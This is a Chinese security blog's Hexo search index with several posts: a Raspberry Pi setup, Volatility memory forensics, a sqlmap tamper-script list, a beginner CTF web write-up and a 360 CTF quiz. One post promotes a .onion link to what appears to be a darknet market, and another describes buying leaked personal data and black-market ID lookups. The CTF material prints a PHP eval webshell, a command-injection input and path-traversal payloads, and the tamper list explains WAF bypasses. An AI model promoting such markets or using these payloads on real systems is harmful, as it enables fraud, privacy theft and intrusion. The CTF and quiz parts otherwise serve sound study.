<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>茶马古道</title>
      <link href="/2019/11/25/%E8%8C%B6%E9%A9%AC%E5%8F%A4%E9%81%93/"/>
      <url>/2019/11/25/%E8%8C%B6%E9%A9%AC%E5%8F%A4%E9%81%93/</url>
      
        <content type="html"><![CDATA[<p>好东西要分享，<br>茶马古道地址<br><a href="http://l2767b4t37ap2wzv6lforfxrxn7dbvw4cgtkalywwoin5ghdvw7obyyd.onion/i/394228" target="_blank" rel="noopener">http://l2767b4t37ap2wzv6lforfxrxn7dbvw4cgtkalywwoin5ghdvw7obyyd.onion/i/394228</a></p><p>有想法的大家可以去了解一下，毕竟挺好的！</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap 脚本详解</title>
      <link href="/2019/11/08/sqlmap-%E8%84%9A%E6%9C%AC%E8%AF%A6%E8%A7%A3/"/>
      <url>/2019/11/08/sqlmap-%E8%84%9A%E6%9C%AC%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h3 id="tamper脚本"><a href="#tamper脚本" class="headerlink" title="tamper脚本"></a>tamper脚本</h3><p>收集自互联网！</p><p>apostrophemask.py</p><p>作用：将引号替换为UTF-8，用于过滤单引号</p><p>base64encode.py</p><p>作用：替换为base64编码</p><p>multiplespaces.py</p><p>作用：围绕SQL关键词添加多个空格</p><p>space2plus.py</p><p>作用：使用+号替换空格</p><p>nonrecursivereplacement.py</p><p>作用：作为双重查询语句，用双重语句替代预定义的SQL关键字（适用于非常强的自定义过滤器，例如将SELECT替换为空）</p><p>space2randomblank.py</p><p>作用：将空格替换为其他有效字符</p><p>unionalltounion.py</p><p>作用：将UNION ALL SELECT替换为UNION SELECT</p><p>securesphere.py</p><p>作用：追加特制的字符串</p><p>space2hash.py</p><p>作用：将空格替换为#号，并随机添加一个字符串和换行符</p><p>space2mssqlblank.py(MsSQL)</p><p>作用：将空格替换为其他空符号</p><p>space2mssqlhash.py</p><p>作用：将空格替换为#号，并添加一个换行符</p><p>between.py</p><p>作用：用NOT BETWEEN 0 AND替换大于号（&gt;），用BETWEEN AND替换等号（=）</p><p>percentage.py</p><p>作用：ASP允许在每个字符前添加一个%号</p><p>sp_password.py</p><p>作用：从DBMS日记的自动模糊处理的有效载荷中添加sp_password</p><p>charencode.py</p><p>作用：对给定的Payload全部字符使用URL编码(不处理已经编码的字符)</p><p>randomcase.py</p><p>作用：随机大小写</p><p>charunicodeencode.py</p><p>作用：字符串unicode编码</p><p>space2comment.py</p><p>作用：将空格替换为/**/</p><p>equaltolike.py</p><p>作用：将等号替换为like</p><p>greatest.py</p><p>作用：绕过对“&gt;”的过滤，用GREATEST替换大于号</p><p>ifnull2ifisnull.py</p><p>作用：绕过IFNULL的过滤，替换类似IFNULL(A,B)为IF(ISNULL(A),B,A)</p><p>modsecurityversioned.py</p><p>作用：过滤空格，使用MySQL内联注释的方式进行注入</p><p>space2mysqlblank.py</p><p>作用：将空格替换为其他空白符号(适用于MySQL)</p><p>modsecurityzeroversioned.py</p><p>作用：使用MySQL内联注释的方式（/<em>!00000</em>/）进行注入</p><p>space2mysqldash.py</p><p>作用：将空格替换为–，并添加一个换行符</p><p>bluecoat.py</p><p>作用：在SQL语句后用有效的随机空白符替换空格，随后用LIKE替换等号</p><p>versionedkeywords.py</p><p>作用：注释绕过</p><p>halfversionedmorekeywords.py</p><p>作用：当数据库为MySQL时绕过防火墙，在每个关键字之前添加MySQL版本注释</p><p>space2morehash.py</p><p>作用：将空格替换为#号，并添加一个随机字符串和换行符</p><p>apostrophenullencode.py</p><p>作用：用非法双字节unicode字符串替换单引号</p><p>appendnullbyte.py</p><p>作用：在有效负荷的结束位置添加零字节字符编码</p><p>chardoubleencode.py</p><p>作用：对给定的Payload全部字符使用双重URL编码(不处理已编码的字符)</p><p>unmagicquotes.py</p><p>作用：使用一个多字节组合（%bf%27）和末尾通用注释一起替换掉空格</p><p>randomcomments.py</p><p>作用：用/**/分割SQL关键字</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>数据泄漏，暗网，社工库！</title>
      <link href="/2019/10/29/1/"/>
      <url>/2019/10/29/1/</url>
      
        <content type="html"><![CDATA[<p>最近，遇到了这样一些事，有点想法，顺便给大家说说。</p><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>某日，在看google语法，灵机一动，随便用了个好友简单查询一下，发现信息泄漏很严重啊。不简单，先通过学校找到姓名，学号，个人照片。然后直接家庭地址，身份证号码，家庭情况都出来了。（可笑的是，社工库没查到，google一搜索全部出来了）。</p><p>这还这是通过姓名入手而且，泄漏的都是大型组织的，看来某企业在这个方面还是的加强啊。关键信息打码处理一下啊，完全暴露在公网，看了一下，大概有几千数据量。当然这个事肯定跟当事人说明了情况。让他自己注意，谨防诈骗！在此也告诫各位，注意信息泄漏，谨防诈骗！</p><h2 id="数据泄漏"><a href="#数据泄漏" class="headerlink" title="数据泄漏"></a>数据泄漏</h2><p>这个事搞完了，顺便上’某加密聊天软件’转了一下，有个老哥出售某东12g裤子（数据）。当时想啥时候的事。然后搜索下。大概是16年12月份流出的，s2漏洞。12g大小。其中包括用户名、密码、邮箱、QQ号、电话号码、身份证等。</p><p>感叹一声，老的啊！</p><p>不扯远了，咱们继续聊。回想起咱们泄漏的数据啊。还是有点多的啊，之前有过总结。国内的，流传出来的，我所了解的，大概有15.6亿的数据量，当然，不包括某东的啊。时间大概是从10年以后就开始泄漏了。到现在，还有泄漏。</p><p>黑市上的肯定不止这么一点，查户籍什么的，都是真的，100一次，都是内部人员。国家对这方面管的严了。人肯定是越来越少，但是。你说一个没有我不相信。</p><p>说起来你们不信，据说上次那个12306四百万当时你想买的话，100块rmb就可以买了。价格不搞吧。这些东西暗网（黑市）上都有，只要你想要。</p><h2 id="暗网"><a href="#暗网" class="headerlink" title="暗网"></a>暗网</h2><p>暗网（英语：Dark web）是存在于黑暗网络、覆盖网络上的万维网内容，只能用特殊软件、特殊授权、或对电脑做特殊设置才能访问[1][2]。暗网构成了深网的一小部分，深网网络没有被网络搜索引擎索引，有时“深网”这一术语被错误地用于指代暗网[3][4][5][6][7]。</p><p>构成暗网的黑暗网络包括F2F的小型点对点网络以及由公共组织和个人运营的大型流行网络，如Tor、自由网、I2P和Riffle。暗网用户基于常规网络未加密的性质将其称为明网[8]。Tor暗网可以称为洋葱区域（onionland）[9]，其使用网络顶级域后缀.onion和洋葱路由的流量匿名化技术</p><p>这是维基百科的解释，个人看法就是黑市，类似与淘宝，只不过商品是枪支，毒品，人口贩卖，数据交易，色情等。那是一个没有法律，没有道德，没有人性的地方。但是他有自己的规矩，那就是匿名，因为在哪儿都是匿名的，谁都不知道谁是谁。但是如果你暴露的，那么你等待的就是被抓，来给大家说个例子，好象是那个12306的卖家，就是上传图片用的是微博的图床，然后就找到被抓了。消失了匿名性，等待的就是，嗯，自己想。</p><p>我接触这个大概是在三年前，当时高中的时候就有了解。那个地方不是什么好地方。给几张图片大家感受一下（本来还想这把网址打码，后来一想，几年前的东西了）<br><img src="/images/aw.jpeg" alt><br><img src="/images/aw1-1.jpeg" alt><br><img src="/images/aw2.jpeg" alt><br><img src="/images/aw3-3.jpeg" alt><br><img src="/images/aw4-4.jpeg" alt><br>上面。这个东西，应该就是网络诈骗的源头了。是要好好管管了。不然，就不会有那么多悲剧发生。</p><h2 id="社工库"><a href="#社工库" class="headerlink" title="社工库"></a>社工库</h2><p>前面聊到了社工库，咱也顺便介绍一下。</p><p>黑客们渐渐积累了大量从互联网泄露的信息。为了方便下一步的入侵，黑客群体使用关系型数据库管理自己的攻击记录，传说中的社工库就此横空出世。个人用户的微信或QQ密码、聊天历史、信用卡信息及支付宝密码，政企用户的后台密码、商业资料乃至国家机密，都可能沦为某个社工库中的隐秘记录。曾经引起轩然大波的开房记录查询网站，就是一个简单而典型的社工库案例。</p><p>用户数据包括别人泄漏和自己拖库。各种数据的集合。</p><p>我接触这个比较晚，差点没搭上末班车，之前闹得沸沸洋洋的几个社工库早就凉了。当年能查的最多的就是qq，最火的就是开房，张口闭口查开房，社会上还是引起一阵骚动啊。那个人没有一点自己的小秘密啊。</p><p>和tg老哥聊了会，发个链接，哈哈，开心了一下。</p><p>话说，现在没想的还能在看见社工库哇，虽然裤子少了的，老了点，但是好歹也是很久没看见了。</p><p><img src="/images/sgk1-2.png" alt></p><p>第二个就是某东的。现在大家都差不多。新的要花钱。</p><p>国外的有一下查询密码泄漏的网站，也顺便发一下。</p><p><img src="/images/sgk1.png" alt></p><p>还有个14亿邮箱密码的，忘记了，算了，这些都之前的事了。记不住了。</p><p>上面都是个人看法，肯定有局限性，望大家多多包涵，上面这些，都是以前的，现在的我，没有裤子，没去暗网。就别问我了。问就是</p><p>我不是，我没有，别瞎说！</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hexo 坑</title>
      <link href="/2019/10/28/hexo-%E5%9D%91/"/>
      <url>/2019/10/28/hexo-%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<p>fatal: 无法读取远程仓库。\n\n请确认您有正确的访问权限并且仓库存在</p><p>解决方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo rm -rf .deploy_git  </span><br><span class="line">hexo clean  </span><br><span class="line">hexo g  </span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>树莓派安装MySQL 搭建数据库</title>
      <link href="/2019/10/28/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85MySQL-%E6%90%AD%E5%BB%BA%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
      <url>/2019/10/28/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85MySQL-%E6%90%AD%E5%BB%BA%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<p>更新系统（可选）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br></pre></td></tr></table></figure><p>开始安装</p><h3 id="1，安装MySQL"><a href="#1，安装MySQL" class="headerlink" title="1，安装MySQL"></a>1，安装MySQL</h3><p>在终端输入以下命令，安装MySQL：</p><p>sudo apt install mariadb-server</p><h3 id="2，设置数据库"><a href="#2，设置数据库" class="headerlink" title="2，设置数据库"></a>2，设置数据库</h3><p>在终端中，运行MySQL安全安装命令</p><p>sudo mysql_secure_installation<br>此时系统会询问你：Enter current password for root (enter for none): ,按回车（enter）键，因为第一次登陆是没有密码的。</p><p>然后会询问你： Set root password? —— 按 y ，进行root帐号的密码设置</p><p>此时，会提示 New password ,在此输入你的MySQL密码，请牢记这个密码，输入完成按回车，会提示re-enter new password此时再重复输入密码，回车即可。</p><p>然后，询问你 Remove anonymous users ，按 y 。</p><p>然后，询问你 Disallow root login remotely ，按 y 。</p><p>然后，询问你 Remove test database and access to it ，按 y 。</p><p>然后，询问你 Reload privilege tables now ，按 y 。</p><p>最后，您将看到消息 All done! 和 Thanks for using MariaDB! 。表示已经设置完成了。</p><h3 id="3，添加数据库"><a href="#3，添加数据库" class="headerlink" title="3，添加数据库"></a>3，添加数据库</h3><p>在终端中运行MySQL</p><p>sudo mysql -u root -p<br>使用刚才设置的root密码，进行登陆</p><p>使用MySQL命令，创建数据库。<br>例如这里创建一个名为cx的数据库：</p><p>create database cx;<br>注意：结束时需要分号</p><p>创建数据库的命令输入成功后，应该会看到</p><p>Query OK,表示创建成功。</p><p>创建MySQL用户<br>创建该用户用于分配刚才创建的数据库，</p><p>例如创建一个名为cx的用户</p><p>create user ‘cx’@’localhost’ IDENTIFIED BY ‘123456’;<br>向用户授权数据库<br>向用户cx授予cx数据库权限。</p><p>GRANT ALL PRIVILEGES ON cx.* TO ‘lingshun’@’localhost’ IDENTIFIED BY ‘123456’;<br>注意：您需要在IDENTIFIED BY之后输入你设置的密码。</p><p>刷新数据库权限<br>要使刚才的更改生效，需要刷新数据库权限，</p><p>输入以下命令：</p><p>FLUSH PRIVILEGES;<br>退出MySQL<br>exit<br>重启一下</p><h3 id="4，安装PhpMyAdmin"><a href="#4，安装PhpMyAdmin" class="headerlink" title="4，安装PhpMyAdmin"></a>4，安装PhpMyAdmin</h3><p>要在php中使用MySQL，则需要安装php-mysql</p><p>sudo apt install php-mysql<br>安装完毕后，在PhpMyAdmin的官网下载最新版本:<br><a href="https://www.phpmyadmin.net/" target="_blank" rel="noopener">https://www.phpmyadmin.net/</a></p><p>在终端中，使用 wget 或者 curl 命令都可以下载</p><p>wget <a href="https://files.phpmyadmin.net/phpMyAdmin/4.9.0.1/phpMyAdmin-4.9.0.1-all-languages.zip" target="_blank" rel="noopener">https://files.phpmyadmin.net/phpMyAdmin/4.9.0.1/phpMyAdmin-4.9.0.1-all-languages.zip</a></p><p>然后，使用unzip命令解压，</p><p>apache的默认网站目录是：/var/www/html/</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>树莓派安装teamviewer</title>
      <link href="/2019/10/28/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85teamviewer/"/>
      <url>/2019/10/28/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85teamviewer/</url>
      
        <content type="html"><![CDATA[<p>安装步骤：</p><p>wget <a href="https://download.teamviewer.com/download/linux/teamviewer-host_armhf.deb" target="_blank" rel="noopener">https://download.teamviewer.com/download/linux/teamviewer-host_armhf.deb</a></p><p>sudo dpkg -i teamviewer-host_armhf.deb<br>sudo apt-get -f install  </p><h2 id="命令行终端环境"><a href="#命令行终端环境" class="headerlink" title="命令行终端环境"></a>命令行终端环境</h2><p>使用SSH远程登录树莓派<br>#查看帮助信息<br>teamviewer help<br>#查看本机ID<br>teamviewer info<br>#设置本机密码<br>sudo teamviewer passwd [你的密码]<br>#启动TeamViewer服务<br>sudo teamviewer –daemon start<br>#开启TeamViewer服务随机启动<br>sudo teamviewer –daemon enable<br>#重启即可连接<br>sudo reboot</p><h2 id="常用管理命令"><a href="#常用管理命令" class="headerlink" title="常用管理命令"></a>常用管理命令</h2><p>teamviewer –daemon start 启动TeamViewer服务<br>teamviewer –daemon stop 停止TeamViewer服务<br>teamviewer –daemon restart 重启TeamViewer<br>teamviewer –daemon disable 关闭TeamViewer服务随机启动<br>teamviewer –daemon enable 开启TeamViewer服务随机启动<br>/usr/bin/teamviewer &amp;   打开teamviewer控制面板  </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>树莓派 4b折腾</title>
      <link href="/2019/10/27/%E6%A0%91%E8%8E%93%E6%B4%BE-4b%E6%8A%98%E8%85%BE/"/>
      <url>/2019/10/27/%E6%A0%91%E8%8E%93%E6%B4%BE-4b%E6%8A%98%E8%85%BE/</url>
      
        <content type="html"><![CDATA[<h2 id="镜像安装"><a href="#镜像安装" class="headerlink" title="镜像安装"></a>镜像安装</h2><p>官网镜像地址：<a href="https://www.raspberrypi.org/downloads/" target="_blank" rel="noopener">https://www.raspberrypi.org/downloads/</a><br>下载完成后将.zip压缩包解压，得到.img镜像<br>Windows下可以使用Win32DiskImager软件刻录到SD卡<br>linux可以使用etcher，个人感觉比dd强</p><h2 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h2><p>在boot分区新建一个ssh文件即可</p><h2 id="账户"><a href="#账户" class="headerlink" title="账户"></a>账户</h2><p>树莓派默认的账户为pi，密码是raspberry；<br>登录成功后启用root账户，输入命令 sudo passwd root，再连续输入两次root密码；<br>启用root账户登录，修改/etc/ssh/sshd_config配置文件，将#PermitRootLogin prohibit-password去掉注释并改为PermitRootLogin yes，再重启树莓派。  </p><h2 id="删除默认的pi账户"><a href="#删除默认的pi账户" class="headerlink" title="删除默认的pi账户"></a>删除默认的pi账户</h2><pre><code>passwd pi -d             #删除pi用户密码userdel -r pi           #删除pi账户文件夹</code></pre><p>更改shell配色，在/root/目录下的.bashrc中加上下面这行，没有.bashrc文件就新建一个。  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS1=&apos;\[\e[01;33m\]\u@\h:\w\$\[\e[0m\] &apos;</span><br></pre></td></tr></table></figure><h2 id="更改更新源"><a href="#更改更新源" class="headerlink" title="更改更新源"></a>更改更新源</h2><p>清华大学开源软件镜像站：  <a href="https://mirror.tuna.tsinghua.edu.cn/help/raspbian/" target="_blank" rel="noopener">https://mirror.tuna.tsinghua.edu.cn/help/raspbian/</a><br>#编辑 /etc/apt/sources.list 文件，删除原文件所有内容，用以下内容取代：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ buster main non-free contrib</span><br><span class="line">deb-src http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ buster main non-free contrib</span><br></pre></td></tr></table></figure><p>#编辑 /etc/apt/sources.list.d/raspi.list 文件，删除原文件所有内容，用以下内容取代：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/raspberrypi/ buster main ui</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-web-wp(新手)</title>
      <link href="/2019/10/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web-wp/"/>
      <url>/2019/10/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web-wp/</url>
      
        <content type="html"><![CDATA[<p>第一题，f12<br><img src="/images/gfsj-web-1.png" alt></p><p>第二题，（请用GET方式提交一个名为a,值为1的变量）<br>（请用GET方式提交一个名为a,值为1的变量，请再以POST方式随便提交一个名为b,值为2的变量）<br><img src="/images/gfsj-web-2.png" alt></p><p>第三题，robots<br>访问robots.txt 获得f1ag_1s_h3re.php，打开<br><img src="/images/gfsj-web-3.png" alt></p><p>第四题，备份文件。<br>index.php备份文件inedx.php.bak下载重命名为php文件打开ok。<br><img src="/images/gfsj-web-4.png" alt></p><p>第五题，cookie<br>打开burpsuite，抓包看看cookie。<br><img src="/images/gfsj-web-5.1.png" alt><br>访问cookie.php<br><img src="/images/gfsj-web-5.2.png" alt></p><p>第六题,不能按的按钮。<br>f12,删除disabled，回车。<br><img src="/images/gfsj-web-6.1.png" alt><br><img src="/images/gfsj-web-6.2.png" alt></p><p>第七题，js<br>打开后有一个密码输入框，burp查看一下。<br><img src="/images/gfsj-web-7.png" alt><br>感觉就是加密解密，js看不懂。两个密文都解一下。<br>得到786OsErtk12。加上格式吧。</p><p>第八题，先burp请求一下，要改ip地址。p地址必须为123.123.123.123<br>1,X-Forwarded-For: 123.123.123.123<br>发现必须来自<a href="https://www.google.com" target="_blank" rel="noopener">https://www.google.com</a><br>2,Referer: <a href="https://www.google.com" target="_blank" rel="noopener">https://www.google.com</a><br><img src="/images/gfsj-web-8.png" alt></p><p>第九题，登录页面，当时以为是注入，发现不是，尝试输入，发现用户名是admin，猜测若口令，直接爆破，其实当时运气好，admin，123456。就的到了<br><img src="/images/gfsj-web-9.png" alt></p><p>第十题，webshell<br>你会使用webshell吗？<br><?php @eval($_POST['shell']);?>   //密码shell，直接连。<br>然后当前目录下有flag.txt打开即可  </p><p>第十一题，ping。<br>burp抓包看了一下，也说了没有waf，估计没有过滤，猜测可以执行命令。<br>ping127.0.0.1,发现是linux系统。尝试一下。127.0.0.1 &amp;&amp; ifconfig<br><img src="/images/gfsj-web-11.png" alt><br>可以执行，那就查找flag文件然后查看内容就ok了。<br><img src="/images/gfsj-web-11.1.png" alt><br>存在/home/flag.txt,cat查看即可。</p><p>第十二题，php代码。<br>要求a不等于0并且转换后等于0，那么根据PHP弱类型，a可以等于0a。b大于1234数字又不能是数字，b可以等于12345%00（%00是空字符）。<br><img src="/images/gfsj-web-12.png" alt></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>内存取证 Volatility</title>
      <link href="/2019/10/20/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81-%E5%AF%86%E7%A0%81%E6%8F%90%E5%8F%96%E4%BB%A5%E5%8F%8AVolatility%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>/2019/10/20/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81-%E5%AF%86%E7%A0%81%E6%8F%90%E5%8F%96%E4%BB%A5%E5%8F%8AVolatility%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>今天接触了内存取证，发现很有趣，学习了学习了。</p><h3 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h3><p>个人感觉就是通过对目标主机上提取的内存镜像分析获取有用信息。<br>大佬都说这是一门艺术，内存取证的艺术。</p><p>内存取证得有内存镜像。那就先来提取内存。</p><h4 id="windows内存镜像提取。"><a href="#windows内存镜像提取。" class="headerlink" title="windows内存镜像提取。"></a>windows内存镜像提取。</h4><p>本地计算机使用dumpit这个软件提取。给出下载地址<a href="https://github.com/mylamour/-_--Forensics-Tools/raw/master/utils/DumpIt.exe" target="_blank" rel="noopener">https://github.com/mylamour/-_--Forensics-Tools/raw/master/utils/DumpIt.exe</a></p><p>操作方法很简单。这里就不说了。提取文件格式是 .raw  </p><p>但是今天遇到坑了。今天提取室友windows10内存镜像，你们猜猜文件有多大。9G多。惹不起啊，分析的话电脑卡死。下次肯定用xp系统。<br><img src="/images/volatility-1.png" alt></p><p>好了，现在着重介绍一下神器。Volatility</p><h5 id="Volatility是一个用于事件响应和恶意软件分析的开源内存取证框架。它是用Python编写的，支持Microsoft-Windows，macOS和Linux"><a href="#Volatility是一个用于事件响应和恶意软件分析的开源内存取证框架。它是用Python编写的，支持Microsoft-Windows，macOS和Linux" class="headerlink" title="Volatility是一个用于事件响应和恶意软件分析的开源内存取证框架。它是用Python编写的，支持Microsoft Windows，macOS和Linux"></a>Volatility是一个用于事件响应和恶意软件分析的开源内存取证框架。它是用Python编写的，支持Microsoft Windows，macOS和Linux</h5><p>kali自带了。就不用安装了，咱们通过实际操作来学习这款工具。</p><p><img src="/images/xp.png" alt="准备好的xp镜像"><br>先解压好，xp.raw  </p><h4 id="volatility-使用："><a href="#volatility-使用：" class="headerlink" title="volatility 使用："></a>volatility 使用：</h4><p>volatility -f &lt;文件名&gt; –profile=&lt;配置文件&gt; &lt;插件&gt; [插件参数]</p><p>获取–profile的参数</p><p>使用imageinfo插件来猜测dump文件的profile值</p><p><img src="/images/xp-1.png" alt><br>我们可以看到系统信息：WinXPSP2x86</p><p>然后在加载执行其他插件时我们都要带上这个参数，指定系统</p><p>volatility -f xp.raw –profile=WinXPSP2x86 &lt;插件&gt; </p><p>不知道设置什么插件？没事 –info  。<br><img src="/images/xp-2.png" alt></p><p>很多，自己看</p><p>介绍基本的插件。</p><p>pslist   列出系统进程<br><img src="/images/xp-3.png" alt></p><p>cmdscan  执行的cmd命令<br><img src="/images/xp-4.png" alt></p><p>filescan  当前打开的文件，配合grep命令可以筛选。<br><img src="/images/xp-5.png" alt></p><p>dumpfile  dump出文件。<br>我们就提取桌面360.jpg照片<br><img src="/images/xp-6.png" alt></p><p>提取文件重命名一下。打开看看<br><img src="/images/xp-7.jpg" alt></p><p>iehistory  IE 浏览器的使用情况。<br><img src="/images/xp-8.png" alt></p><p>netscan   网络连接情况 。<br>这个命令我查的时候没有结果，报错了。就不发截屏了。</p><p>这些都是简单命令，更多参数查看-h和–info。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>360ctf 理论题（2019）</title>
      <link href="/2019/10/19/360ctf-%E7%90%86%E8%AE%BA%E9%A2%98%EF%BC%882019%EF%BC%89/"/>
      <url>/2019/10/19/360ctf-%E7%90%86%E8%AE%BA%E9%A2%98%EF%BC%882019%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h3 id="360网络安全职业技能大赛初赛理论分赛"><a href="#360网络安全职业技能大赛初赛理论分赛" class="headerlink" title="360网络安全职业技能大赛初赛理论分赛"></a>360网络安全职业技能大赛初赛理论分赛</h3><p>1.（单选题）<br>如果使用sqlmap进行注入时需要指定注入技术，则需要使用哪个参数（）<br>（4 分）</p><p>—dbs</p><p>—risk</p><p>—Level</p><p>—technique<br>2.（单选题）<br>网站文件存放在/www/html/ 目录下，且页面中包含include($_GET[‘page’]);关键代码，以下哪个选项不可以获得linux系统中自有的passwd文件内容（）<br>（4 分）</p><p>?page=../etc/passwd</p><p>?page=../../../etc/passwd</p><p>?page=../../../../../etc/passwd</p><p>?page=../../../../../../etc/passwd<br>3.（多选题）<br>IIS6.0存在的文件解析漏洞，是由于哪些特殊符号导致利用（）<br>（4 分）</p><p>:</p><p>;</p><p>@</p><p>/<br>4.（单选题）<br>RSA算法，在以下哪种特定场景相对安全（）<br>（4 分）</p><p>e很大</p><p>p和q很大，但相近</p><p>e很小</p><p>n很大<br>5.（单选题）<br>下列哪项为nmap使用ICMP进行C段扫描，但不进行扫描端口和DNS反向查询（）<br>（4 分）</p><p>nmap –Pn -sn –n 192.168.1.1/24</p><p>nmap –Ss -sn –n 192.168.1.1/24</p><p>nmap –sn 192.168.1.1/24</p><p>nmap –PE –sn –n 192.168.1.1/24<br>6.（多选题）<br>以下方法中可能存在命令执行漏洞的有（）<br>（4 分）</p><p>string shell_exec ( string $cmd )</p><p>string exec ( string $command [, array &amp;$output [, int &amp;$return_var ]] )</p><p>void passthru ( string $command [, int &amp;$return_var ] )</p><p>string escapeshellarg ( string $arg )<br>7.（单选题）<br>PHP错误页面信息不包括（）<br>（4 分）</p><p>语法错误信息</p><p>出错文件所在位置</p><p>错误信息所在行</p><p>PHP版本信息<br>8.（多选题）<br>只允许192.168.1.80/32访问某Linux主机，可采用（      ）方法实现。<br>（4 分）</p><p>本机防火墙</p><p>网络防火墙</p><p>本机hosts.allow文件</p><p>本机hosts.deny文件<br>9.（单选题）<br>这段代码是以下哪种漏洞类型的payload（）<br>Runtime.getRuntime().exec(request.getParameter(“cmd”));（）<br>（4 分）</p><p>SQL注入漏洞</p><p>命令执行漏洞</p><p>XSS跨站漏洞</p><p>文件读取漏洞<br>10.（单选题）<br>DDOS反射攻击中，下面哪项协议拥有最大的反射倍数（）<br>（4 分）</p><p>DNS</p><p>MEMCACHE</p><p>TFTP</p><p>SNMP<br>11.（单选题）<br>Apache解析文件的机制是（）<br>（4 分）</p><p>不允许多个点分割的后缀，从右向左解析</p><p>允许多个点分割的后缀，从右向左解析</p><p>不允许多个点分割的后缀，从右向左解析并裁剪不存在的路径</p><p>允许多个点分割的后缀，从右向左解析并裁剪不存在的路径<br>12.（单选题）<br>metasploit使用ms17-010攻击机器哪个端口服务（）<br>（4 分）</p><p>445</p><p>139</p><p>135</p><p>1025<br>13.（单选题）<br>导致Tomcat任意文件上传漏洞(CVE-2017-12615)的原因是（）<br>（4 分）</p><p>允许POST请求方法</p><p>允许OPTIONS请求方法</p><p>配置文件中readonly参数设置为false</p><p>配置文件中readonly参数设置为true<br>14.（单选题）<br>文件包含漏洞可以与以下哪个漏洞配合，实现Getshell（）<br>（4 分）</p><p>逻辑漏洞</p><p>上传漏洞</p><p>信息泄露</p><p>反射型XSS<br>15.（单选题）<br>当用户在浏览器中输入一个需要登录的网址时，系统先去哪里查询IP地址？<br>（4 分）</p><p>本地域名服务器</p><p>顶级域名服务器</p><p>根域名服务器</p><p>hosts文件<br>16.（单选题）<br>下面哪种处理文件上传的方式不够妥当 （）<br>（4 分）</p><p>通过黑名单验证上传的文件后缀名称</p><p>设置上传目录不可解析</p><p>重命名上传的文件名称</p><p>使用单独的服务器存放上传的文件<br>17.（单选题）<br>目标计算机与网关通信失败，同时导致通信重定向的攻击形式是以下哪种攻击？<br>（4 分）</p><p>病毒</p><p>木马</p><p>DOS</p><p>ARP欺骗<br>18.（单选题）<br>关于文件解析描述正确的是（）<br>（4 分）</p><p>文件解析过程就是读取文件内容的过程</p><p>文件解析就是找到文件存放路径的过程</p><p>文件解析是找到能处理该文件应用的过程</p><p>文件解析由操作系统负责<br>19.（单选题）<br>DNS系统NS记录主要作用（）<br>（4 分）</p><p>主机IP地址</p><p>域名服务器记录</p><p>域名说明</p><p>邮件交换记录<br>20.（单选题）<br>我们在浏览器看到的web服务器证书中，包含了（）<br>（4 分）</p><p>服务器的公钥</p><p>服务器的私钥</p><p>客户端浏览器的公钥</p><p>客户端浏览器的私钥<br>21.（单选题）<br>在IPSec中，（  ）协议既可以实现数据加密，又可以实现数据完整性验证和数据源身份认证。<br>（4 分）</p><p>AH</p><p>GRE</p><p>MPLS</p><p>ESP<br>22.（多选题）<br>对于SQL注入攻击的防御，可以采取哪些措施（）。<br>（4 分）</p><p>不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。</p><p>不要把机密信息直接存放数据库，加密密码和敏感的信息。</p><p>不要使用动态拼装sql，可以使用参数化的sql或者直接使用存储过程进行数据查询存取。</p><p>对表单里的数据进行验证与过滤，在实际开发过程中可以单独列一个验证函数，该函数把每个要过滤的关键词如select，1=1等都列出来，然后每个表单提交时都调用这个函数。<br>23.（单选题）<br>GIT版本控制系统添加文件到仓库以后，文件会被存储到仓库哪个文件夹（）<br>（4 